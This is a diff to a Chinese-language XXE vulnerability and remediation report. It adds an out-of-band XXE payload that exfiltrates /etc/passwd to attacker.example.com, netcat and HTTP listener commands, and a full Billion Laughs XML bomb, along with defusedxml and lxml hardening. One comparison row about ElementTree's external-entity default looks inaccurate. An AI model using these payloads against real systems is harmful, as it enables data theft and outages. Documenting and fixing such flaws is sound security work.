@@ -155,6 +155,79 @@ XML 输入：
 结果：✅ 同样可读取系统敏感文件
 ```
 
+### POC 6：Out-of-Band XXE（OOB-XXE）数据外带
+
+当攻击者无法直接看到解析结果时（盲 XXE），可利用 OOB-XXE 将数据发送到攻击者控制的服务器：
+
+```
+攻击者监听服务器：attacker.example.com:8888
+
+XML 输入：
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com:8888/?data=%file;'>">
+%eval;
+%exfil;
+
+执行流程：
+① 定义 %file 实体 → 读取 /etc/passwd 内容
+② 定义 %eval 实体 → 动态构造新的实体定义
+   在参数实体中嵌套另一个参数实体，创建 HTTP 请求
+③ %exfil 实体 → 将文件内容作为 URL 参数发出
+
+结果：攻击者服务器收到 GET 请求
+     GET /?data=root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A...
+     → 成功窃取文件内容（无需回显）
+```
+
+**盲 XXE 判断方法：**
+
+```
+外带检测命令（攻击者服务器）：
+nc -lvp 8888
+python3 -m http.server 8888
+
+如果服务器发出 HTTP 请求 → 存在 XXE ✅
+如果没有收到任何请求 → 可能无 XXE 或 XML 解析器禁用了外部实体
+```
+
+### POC 7：XML Bomb（Billion Laughs 拒绝服务）
+
+通过递归实体定义，用极小的 XML 负载导致服务器内存耗尽：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<users>&lol9;</users>
+```
+
+**指数级扩展原理：**
+
+```
+实体展开过程：
+lol  = "lol"                              → 3 字节
+lol2 = &lol;&lol;&lol;&lol;&lol;...×10    → 30 字节
+lol3 = &lol2;&lol2;...×10                 → 300 字节
+lol4 → 3 KB
+lol5 → 30 KB
+lol6 → 300 KB
+lol7 → 3 MB
+lol8 → 30 MB
+lol9 → 300 MB
+
+结果：不到 1 KB 的 XML → 展开后 300 MB+ 
+      轻则服务响应缓慢，重则内存溢出导致宕机
+```
+
 ### 修复前验证结果
 
 | 测试用例 | 输入路径 | 结果 |
@@ -202,8 +275,21 @@ XML 输入：
 | **源码泄露** | 🔴 严重 | 泄露 SECRET_KEY、数据库结构、业务逻辑 |
 | **敏感文件泄露** | 🔴 严重 | `/etc/shadow`、SSH 密钥等系统敏感信息 |
 | **数据库泄露** | 🔴 严重 | 可读取完整 SQLite 数据库文件 |
+| **OOB 数据外带** | 🔴 严重 | 盲 XXE 下通过 HTTP 外带敏感数据，即使无直接回显也可窃取 |
+| **XML Bomb DoS** | 🟠 中危 | 递归实体导致内存耗尽，服务不可用 |
 | **内网探测** | 🟠 中危 | 结合 SSRF 可扫描内网服务 |
 | **信息泄露** | 🟡 低危 | 错误消息暴露服务器内部路径 |
+
+### XXE 攻击类型对比
+
+| 攻击类型 | 利用方式 | 是否需要回显 | 防御难度 |
+|---------|---------|:-----------:|:--------:|
+| **经典 XXE** | 直接通过解析结果读取文件 | ✅ 需要 | ⭐⭐ 中 |
+| **OOB-XXE（盲 XXE）** | 通过 HTTP/DNS 外带数据到攻击者服务器 | ❌ 不需要 | ⭐⭐⭐ 难 |
+| **Error-Based XXE** | 通过错误消息推断文件内容（逐字符外带） | ❌ 不需要 | ⭐⭐⭐ 难 |
+| **XInclude** | 利用 XML Inclusion 指令读取文件 | ✅ 需要 | ⭐ 低 |
+| **XML Bomb** | 递归实体膨胀（10⁹ 倍）耗尽服务器内存 | N/A | ⭐⭐ 中 |
+| **SSRF via XXE** | 利用 SYSTEM 发起 HTTP 请求到内网服务 | ⚠ 部分需要 | ⭐⭐⭐⭐ 高 |
 
 ---
 
@@ -375,14 +461,38 @@ parser = etree.XMLParser(
 root = etree.fromstring(xml_data, parser)
 ```
 
-### Python 标准库的安全替代方案
+### Python XML 解析库安全对比
+
+| 特性 | `xml.etree.ElementTree` | `defusedxml` | `lxml` |
+|------|:----------------------:|:------------:|:------:|
+| **标准库自带** | ✅ 是 | ❌ 需安装 | ❌ 需安装 |
+| **XXE 防护** | ❌ 默认无（需手动禁用） | ✅ **默认开启** | ✅ 可配置 |
+| **Billion Laughs 防护** | ❌ 默认无 | ✅ 自动检测 | ✅ 通过 `huge_tree` 限制 |
+| **外部实体解析** | ❌ 默认开启 | ✅ 默认禁用 | ❌ 默认开启 |
+| **DTD 拉取** | ❌ 不阻止 | ✅ 默认阻止 | ⚠ 需配置 |
+| **网络请求** | ❌ 可发起 | ✅ 完全阻止 | ⚠ 需配置 |
+| **OOB-XXE 防护** | ❌ 无 | ✅ 网络请求被阻断 | ⚠ 需配置 |
+| **使用复杂度** | ⭐ 简单 | ⭐ 简单 | ⭐⭐⭐ 复杂 |
+| **性能** | ⭐⭐⭐ 中等 | ⭐⭐⭐ 中等 | ⭐⭐⭐⭐⭐ 快 |
+| **官方推荐** | ❌ | ✅ **Python 官方推荐** | ❌ |
+
+**最安全做法（生产环境推荐）：**
 
 ```python
-# 使用 xml.etree.ElementTree 的安全模式
+# 方案一：使用 defusedxml（Python 官方推荐）
 import defusedxml.ElementTree as ET
-# defusedxml 是 Python 官方推荐的 XXE 防护库
-# 自动阻止实体扩展、外部实体、DTD 拉取等攻击
+# 自动阻止：实体扩展、外部实体、DTD 拉取、网络请求
 root = ET.fromstring(xml_data)
+
+# 方案二：手动配置 lxml
+from lxml import etree
+parser = etree.XMLParser(
+    resolve_entities=False,    # 不解析实体
+    no_network=True,           # 禁止网络访问
+    dtd_validation=False,      # 不校验 DTD
+    huge_tree=False,           # 禁止超大文档
+)
+root = etree.fromstring(xml_data, parser)
 ```
 
 ### 修复前后对比
